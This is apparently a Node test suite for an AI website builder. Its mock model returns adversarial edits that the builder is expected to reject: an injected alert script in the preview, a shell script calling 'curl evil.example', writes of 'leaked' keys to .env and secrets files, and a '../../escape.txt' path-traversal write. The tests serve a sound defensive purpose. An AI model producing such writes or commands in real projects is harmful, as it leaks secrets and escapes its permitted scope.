/**
 * AI-mode behavior, exercised through an injected deterministic mock provider.
 *
 * The baseline suite runs with the LLM disabled, so it only covers the
 * template/deterministic paths. This file covers the real-provider code paths
 * without any network access:
 *
 *   - AI-authored specification and source are preserved end to end.
 *   - The ForgeWeb-owned sandbox preview can never be AI-authored.
 *   - Omitted baseline artifacts are backfilled, so an AI build is never
 *     clobbered by the professional-frontend compatibility upgrade.
 *   - AI review findings are advisory and cannot block a build that passed the
 *     deterministic gate.
 *   - AI editing applies real model output under scope guardrails, and degrades
 *     to the deterministic scoped edit whenever the model is unusable.
 */

import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import type { LlmOptions, LlmProvider, LlmResponse } from "../llm/index.ts";
import { resetLlmConfig, resetLlmProvider, setLlmProvider } from "../llm/index.ts";
import { JsonStore } from "../store.ts";
import { BuildWorkflow } from "../workflow.ts";

process.env.FORGEWEB_LLM_ENABLED = "true";
process.env.FORGEWEB_LLM_PROVIDER = "ollama";
process.env.FORGEWEB_LLM_MODEL = "mock-coder";
resetLlmConfig();
resetLlmProvider();

const AI_APP_MARKER = "AI_AUTHORED_APP_MARKER";
const AI_CSS_MARKER = "AI_AUTHORED_CSS_MARKER";
const AI_PREVIEW_MARKER = "AI_AUTHORED_PREVIEW_MARKER";

const SPECIFICATION_RESPONSE = JSON.stringify({
  productName: "AI Task Console",
  summary: "An AI-authored task console specification.",
  roles: ["Owner", "Member"],
  entities: ["Task", "Project"],
  requirements: [
    { id: "REQ-A01", title: "Authenticated access", description: "Members authenticate before reaching any task data.", acceptanceCriteria: ["Unauthenticated requests are rejected."], priority: "P0" },
    { id: "REQ-A02", title: "Task lifecycle", description: "Members create, edit, complete, and delete tasks.", acceptanceCriteria: ["A task can be completed and deleted."], priority: "P0" },
    { id: "REQ-A03", title: "Due dates", description: "Tasks carry an optional due date.", acceptanceCriteria: ["A due date can be set and cleared."], priority: "P1" },
  ],
  assumptions: ["AI assumption recorded."],
});

// Deliberately wrapped in a markdown fence and padded with prose so the parser's
// fence-stripping and JSON extraction are exercised, not bypassed.
const FRONTEND_RESPONSE = `Here are the frontend files:\n\n\`\`\`json\n${JSON.stringify({
  files: [
    {
      path: "frontend/src/App.tsx",
      content: `// ${AI_APP_MARKER}\nimport TaskList from "./components/TaskList.js";\n\nexport default function App() {\n  return <TaskList />;\n}\n`,
      requirementIds: ["REQ-A01", "REQ-A02"],
    },
    {
      path: "frontend/src/components/TaskList.tsx",
      content: `// ${AI_APP_MARKER}\nexport default function TaskList() {\n  return <ul />;\n}\n`,
      requirementIds: ["REQ-A02"],
    },
    {
      path: "frontend/src/styles.css",
      content: `/* ${AI_CSS_MARKER} */\n:root { --accent: #dfff68; }\n.task-list { display: grid; }\n`,
      requirementIds: ["REQ-A03"],
    },
    {
      // ForgeWeb owns the sandbox preview. This must be dropped, script and all.
      path: "frontend/preview.html",
      content: `<!doctype html><html><body><!-- ${AI_PREVIEW_MARKER} --><script>alert(1)</script></body></html>`,
      requirementIds: ["REQ-A01"],
    },
  ],
}, null, 2)}\n\`\`\`\n`;

const BACKEND_RESPONSE = JSON.stringify({
  files: [
    {
      path: "backend/src/index.ts",
      content: 'export const service = { name: "AI Task Console", status: "ready", apiVersion: "v1" } as const;\nexport const AI_AUTHORED_BACKEND = true;\n',
      requirementIds: ["REQ-A01"],
    },
    {
      path: "backend/src/api/contracts.ts",
      content: "export type CreateTaskInput = { title: string; dueDate?: string };\nexport type DeleteTaskInput = { id: string };\n",
      requirementIds: ["REQ-A02", "REQ-A03"],
    },
  ],
});

const REVIEW_RESPONSE = JSON.stringify({
  findings: [
    { severity: "info", message: "Requirement coverage looks complete.", path: null },
    { severity: "warning", message: "Consider extracting the task form into its own component.", path: "frontend/src/App.tsx" },
    { severity: "error", message: "Model believes authorization is incomplete.", path: "backend/src/index.ts" },
  ],
  summary: "Reviewed with one model-reported error.",
});

type Handler = (prompt: string, options?: LlmOptions) => string;

/** A deterministic in-process provider. Never touches the network. */
class MockProvider implements LlmProvider {
  readonly name = "MockProvider";
  readonly calls: string[] = [];
  private readonly available: boolean;
  private readonly handler: Handler;

  constructor(handler: Handler, available = true) {
    this.handler = handler;
    this.available = available;
  }

  async isAvailable(): Promise<boolean> {
    return this.available;
  }

  async generate(prompt: string, options?: LlmOptions): Promise<LlmResponse> {
    this.calls.push(stage(prompt));
    return {
      content: this.handler(prompt, options),
      model: "mock-coder",
      tokensUsed: { prompt: 100, completion: 200 },
      durationMs: 1,
    };
  }
}

/** Classify which workflow stage a prompt came from. */
function stage(prompt: string): "specification" | "frontend" | "backend" | "review" | "edit" | "unknown" {
  if (prompt.includes("Analyze the following application idea")) return "specification";
  if (prompt.includes("Generate a professional React/TypeScript frontend")) return "frontend";
  if (prompt.includes("Generate typed Node.js/TypeScript backend files")) return "backend";
  if (prompt.includes("Review the following generated files")) return "review";
  if (prompt.includes("Apply the following edit")) return "edit";
  return "unknown";
}

/** The happy-path handler: a full, well-formed AI project. */
function coherentHandler(prompt: string): string {
  switch (stage(prompt)) {
    case "specification": return SPECIFICATION_RESPONSE;
    case "frontend": return FRONTEND_RESPONSE;
    case "backend": return BACKEND_RESPONSE;
    case "review": return REVIEW_RESPONSE;
    default: return "{}";
  }
}

async function fixture() {
  const directory = await mkdtemp(join(tmpdir(), "forgeweb-llm-test-"));
  const store = new JsonStore(directory);
  await store.initialize();
  return { directory, store, workflow: new BuildWorkflow(store, 0) };
}

async function waitForBuild(workflow: BuildWorkflow, buildId: string, expected: string[]) {
  for (let attempt = 0; attempt < 200; attempt += 1) {
    const build = workflow.get(buildId);
    if (expected.includes(build.status)) return build;
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
  throw new Error("Build did not reach a terminal state.");
}

/** Drive a build to completion with the given provider. */
async function completedBuild(workflow: BuildWorkflow, prompt: string) {
  const created = await workflow.create(prompt);
  const proposal = await waitForBuild(workflow, created.id, ["awaiting_confirmation", "needs_context", "failed"]);
  assert.equal(proposal.status, "awaiting_confirmation");
  assert.equal(proposal.filePaths.length, 0, "no source code may exist before confirmation");
  await workflow.confirm(created.id);
  return waitForBuild(workflow, created.id, ["completed", "failed"]);
}

test("an AI build preserves model-authored source, keeps the ForgeWeb preview, and backfills omitted baseline artifacts", async () => {
  const { directory, workflow } = await fixture();
  const provider = new MockProvider(coherentHandler);
  setLlmProvider(provider);
  try {
    const build = await completedBuild(workflow, "Build a task management application with authentication, projects, tasks, due dates, and status tracking.");
    assert.equal(build.status, "completed");

    // The AI specification was used, not the template heuristic.
    assert.equal(build.specification?.productName, "AI Task Console");
    assert.equal(build.specification?.status, "approved");
    assert.deepEqual(build.specification?.requirements.map((requirement) => requirement.id), ["REQ-A01", "REQ-A02", "REQ-A03"]);
    assert.ok(build.specification?.architecture.markdown.includes("AI Task Console"));
    assert.equal(build.llmMetadata?.fallbackUsed, false);
    assert.equal(build.llmMetadata?.provider, "MockProvider");
    assert.equal(build.llmMetadata?.model, "mock-coder");
    assert.ok((build.llmMetadata?.tokensUsed.completion ?? 0) > 0);

    // Every stage that should consult the model did so.
    assert.deepEqual(provider.calls, ["specification", "frontend", "backend", "review"]);

    // AI-authored source survives, including files with no baseline counterpart.
    const project = workflow.getProject(build.projectId);
    const byPath = new Map(project.files.map((file) => [file.path, file]));
    assert.ok(byPath.get("frontend/src/App.tsx")?.content.includes(AI_APP_MARKER));
    assert.ok(byPath.get("frontend/src/components/TaskList.tsx")?.content.includes(AI_APP_MARKER));
    assert.ok(byPath.get("frontend/src/styles.css")?.content.includes(AI_CSS_MARKER));
    assert.ok(byPath.get("backend/src/index.ts")?.content.includes("AI_AUTHORED_BACKEND"));
    assert.ok(byPath.get("backend/src/api/contracts.ts")?.content.includes("DeleteTaskInput"));

    // The sandbox preview is ForgeWeb-controlled: the model's version is dropped.
    const preview = byPath.get("frontend/preview.html")?.content ?? "";
    assert.ok(preview.includes("forgeweb-professional-v2"));
    assert.ok(!preview.includes(AI_PREVIEW_MARKER));
    assert.ok(!preview.includes("<script>alert(1)</script>"));

    // Omitted baseline artifacts are backfilled so the project stays coherent.
    for (const path of ["README.md", "ARCHITECTURE.md", "package.json", "frontend/src/main.tsx", "backend/src/domain/model.ts", "backend/src/security/access-control.ts", "tests/acceptance.test.ts"]) {
      assert.ok(byPath.has(path), `expected backfilled baseline artifact: ${path}`);
    }
    // 5 AI-authored files (the model's preview dropped) + 8 backfilled baseline
    // artifacts. Notably not the template's fixed 15.
    assert.equal(build.filePaths.length, 16);
    assert.notEqual(build.filePaths.length, 15);

    // Because the merge guarantees a professional frontend, the compatibility
    // upgrade must not fire and must not overwrite AI-authored source.
    const ready = await workflow.workspace.getReady(build.projectId);
    assert.equal(ready.currentVersion?.versionNumber, 1);
    assert.equal(ready.versions.length, 1);
    assert.ok(ready.files.find((file) => file.path === "frontend/src/App.tsx")?.content.includes(AI_APP_MARKER));
    assert.match((await workflow.workspace.getPreview(build.projectId)).html, /forgeweb-professional-v2/);

    // Validation is honest: real passes, an explicit skip, and no failures.
    assert.ok(build.validationChecks.every((check) => check.status !== "failed"));
    assert.ok(build.validationChecks.some((check) => check.name === "P0 requirement coverage" && check.status === "passed"));
    assert.ok(build.validationChecks.some((check) => check.status === "skipped"));
  } finally {
    resetLlmProvider();
    await rm(directory, { recursive: true, force: true });
  }
});

test("AI review findings are advisory and cannot block a build that passed the deterministic gate", async () => {
  const { directory, workflow } = await fixture();
  setLlmProvider(new MockProvider(coherentHandler));
  try {
    const build = await completedBuild(workflow, "Build a task management application with authentication, projects, tasks, due dates, and status tracking.");
    assert.equal(build.status, "completed");

    const advisory = build.reviewFindings.filter((finding) => finding.message.startsWith("[AI reviewer"));
    assert.equal(advisory.length, 3);
    // The model's "error" is recorded as a warning for gating, with the original
    // severity preserved in the message for transparency.
    const downgraded = advisory.find((finding) => finding.message.includes("model flagged as error"));
    assert.ok(downgraded);
    assert.equal(downgraded.severity, "warning");
    assert.match(downgraded.message, /authorization is incomplete/);
    assert.ok(build.reviewFindings.every((finding) => finding.severity !== "error"));

    // The deterministic review still ran and still reported its own verdict.
    assert.ok(build.reviewFindings.some((finding) => !finding.message.startsWith("[AI reviewer")));
    assert.ok(build.validationChecks.some((check) => check.name === "Independent review" && check.status === "passed"));
  } finally {
    resetLlmProvider();
    await rm(directory, { recursive: true, force: true });
  }
});

test("an unreachable provider degrades to deterministic template generation", async () => {
  const { directory, workflow } = await fixture();
  const provider = new MockProvider(coherentHandler, false);
  setLlmProvider(provider);
  try {
    const build = await completedBuild(workflow, "Build a simple task management application where users can create, edit, complete, and delete tasks.");
    assert.equal(build.status, "completed");
    assert.equal(provider.calls.length, 0, "an unavailable provider must never be prompted");
    assert.equal(build.llmMetadata?.fallbackUsed, true);
    assert.equal(build.filePaths.length, 15);
    assert.equal(build.specification?.requirements.length, 6);
    assert.notEqual(build.specification?.productName, "AI Task Console");
    assert.ok(build.validationChecks.every((check) => check.status !== "failed"));
    assert.ok(build.reviewFindings.every((finding) => !finding.message.startsWith("[AI reviewer")));
  } finally {
    resetLlmProvider();
    await rm(directory, { recursive: true, force: true });
  }
});

test("unparseable model output degrades to deterministic template generation instead of shipping garbage", async () => {
  const { directory, workflow } = await fixture();
  const provider = new MockProvider(() => "I'm sorry, I cannot produce JSON for that request.");
  setLlmProvider(provider);
  try {
    const build = await completedBuild(workflow, "Build a simple task management application where users can create, edit, complete, and delete tasks.");
    assert.equal(build.status, "completed");
    assert.ok(provider.calls.includes("specification"));
    assert.equal(build.llmMetadata?.fallbackUsed, true);
    assert.equal(build.filePaths.length, 15);
    assert.ok(build.validationChecks.every((check) => check.status !== "failed"));
    // A model that cannot produce a valid review must add no findings at all.
    assert.ok(build.reviewFindings.every((finding) => !finding.message.startsWith("[AI reviewer")));
  } finally {
    resetLlmProvider();
    await rm(directory, { recursive: true, force: true });
  }
});

test("an AI edit rewrites real source, is refused the sandbox preview, and produces an immutable new version", async () => {
  const { directory, workflow } = await fixture();
  setLlmProvider(new MockProvider(coherentHandler));
  try {
    const build = await completedBuild(workflow, "Build a task management application with authentication, projects, tasks, due dates, and status tracking.");
    assert.equal(build.status, "completed");
    const before = workflow.workspace.get(build.projectId);
    const previewDigestBefore = before.files.find((file) => file.path === "frontend/preview.html")?.digest;
    const backendDigestBefore = before.files.find((file) => file.path === "backend/src/index.ts")?.digest;

    setLlmProvider(new MockProvider((prompt) => {
      if (stage(prompt) !== "edit") return coherentHandler(prompt);
      return JSON.stringify({
        modifiedFiles: [
          {
            path: "frontend/src/App.tsx",
            content: `// ${AI_APP_MARKER}\n// AI_EDIT_APPLIED\nimport TaskList from "./components/TaskList.js";\n\nexport default function App() {\n  return <main><TaskList /></main>;\n}\n`,
            requirementIds: ["REQ-A01", "REQ-A02"],
          },
          {
            // ForgeWeb owns the preview: this must be silently ignored.
            path: "frontend/preview.html",
            content: "<!doctype html><html><body>hijacked</body></html>",
            requirementIds: ["REQ-A01"],
          },
        ],
        summary: "Wrapped the task list in a main landmark.",
      });
    }));

    const edited = await workflow.workspace.edit(build.projectId, "Wrap the task list in a main landmark for accessibility.");
    assert.deepEqual(edited.modifiedFiles, ["frontend/src/App.tsx"]);
    assert.equal(edited.workspace.currentVersion?.versionNumber, 2);
    assert.equal(edited.workspace.versions.length, 2);

    const app = edited.workspace.files.find((file) => file.path === "frontend/src/App.tsx");
    assert.ok(app?.content.includes("AI_EDIT_APPLIED"));
    assert.deepEqual(app?.requirementIds, ["REQ-A01", "REQ-A02"]);
    // Untouched files — and the protected preview — keep their exact digests.
    assert.equal(edited.workspace.files.find((file) => file.path === "frontend/preview.html")?.digest, previewDigestBefore);
    assert.equal(edited.workspace.files.find((file) => file.path === "backend/src/index.ts")?.digest, backendDigestBefore);
    assert.ok(!edited.workspace.files.some((file) => file.content.includes("hijacked")));

    // Version 1 remains immutable and restorable.
    const versionOne = edited.workspace.versions.find((version) => version.versionNumber === 1)!;
    const restored = await workflow.workspace.restore(build.projectId, versionOne.id);
    assert.ok(!restored.files.find((file) => file.path === "frontend/src/App.tsx")?.content.includes("AI_EDIT_APPLIED"));
    assert.ok(restored.files.find((file) => file.path === "frontend/src/App.tsx")?.content.includes(AI_APP_MARKER));
  } finally {
    resetLlmProvider();
    await rm(directory, { recursive: true, force: true });
  }
});

test("an out-of-scope AI edit is discarded and the deterministic scoped edit is used instead", async () => {
  const { directory, workflow } = await fixture();
  setLlmProvider(new MockProvider(coherentHandler));
  try {
    const build = await completedBuild(workflow, "Build a task management application with authentication, projects, tasks, due dates, and status tracking.");
    assert.equal(build.status, "completed");

    setLlmProvider(new MockProvider((prompt) => {
      if (stage(prompt) !== "edit") return coherentHandler(prompt);
      return JSON.stringify({
        modifiedFiles: [
          { path: "secrets/keys.json", content: '{"apiKey":"leaked"}', requirementIds: ["REQ-A01"] },
          { path: "infra/deploy.sh", content: "#!/bin/sh\ncurl evil.example\n", requirementIds: ["REQ-A01"] },
        ],
        summary: "Attempted an out-of-scope change.",
      });
    }));

    const edited = await workflow.workspace.edit(build.projectId, "Make the dashboard cards smaller and modern. Keep everything else unchanged.");
    // Fell back to the deterministic scoped edit, whose signature is the CSS pair.
    assert.deepEqual(edited.modifiedFiles.sort(), ["frontend/preview.html", "frontend/src/styles.css"]);
    assert.equal(edited.workspace.currentVersion?.versionNumber, 2);
    assert.ok(!edited.workspace.files.some((file) => file.path === "secrets/keys.json"));
    assert.ok(!edited.workspace.files.some((file) => file.path === "infra/deploy.sh"));
    assert.ok(!edited.workspace.files.some((file) => file.content.includes("leaked")));
  } finally {
    resetLlmProvider();
    await rm(directory, { recursive: true, force: true });
  }
});

test("an AI edit targeting a protected path is discarded before it reaches the project", async () => {
  const { directory, workflow } = await fixture();
  setLlmProvider(new MockProvider(coherentHandler));
  try {
    const build = await completedBuild(workflow, "Build a task management application with authentication, projects, tasks, due dates, and status tracking.");
    assert.equal(build.status, "completed");

    setLlmProvider(new MockProvider((prompt) => {
      if (stage(prompt) !== "edit") return coherentHandler(prompt);
      return JSON.stringify({
        modifiedFiles: [
          { path: ".env", content: "LLM_API_KEY=leaked\n", requirementIds: ["REQ-A01"] },
          { path: "../../escape.txt", content: "escaped", requirementIds: ["REQ-A01"] },
        ],
        summary: "Attempted to write secrets and escape the project.",
      });
    }));

    const edited = await workflow.workspace.edit(build.projectId, "Make the dashboard cards smaller and modern. Keep everything else unchanged.");
    assert.deepEqual(edited.modifiedFiles.sort(), ["frontend/preview.html", "frontend/src/styles.css"]);
    assert.ok(!edited.workspace.files.some((file) => file.path.includes(".env")));
    assert.ok(!edited.workspace.files.some((file) => file.path.includes("..")));
    assert.ok(!edited.workspace.files.some((file) => file.content.includes("leaked")));

    // The exported archive carries no secret or escaped path either.
    const exported = await workflow.workspace.export(build.projectId);
    assert.equal(exported.archive.subarray(0, 2).toString(), "PK");
    assert.ok(!exported.archive.includes(Buffer.from("LLM_API_KEY")));
    assert.ok(!exported.archive.includes(Buffer.from("escape.txt")));
  } finally {
    resetLlmProvider();
    await rm(directory, { recursive: true, force: true });
  }
});
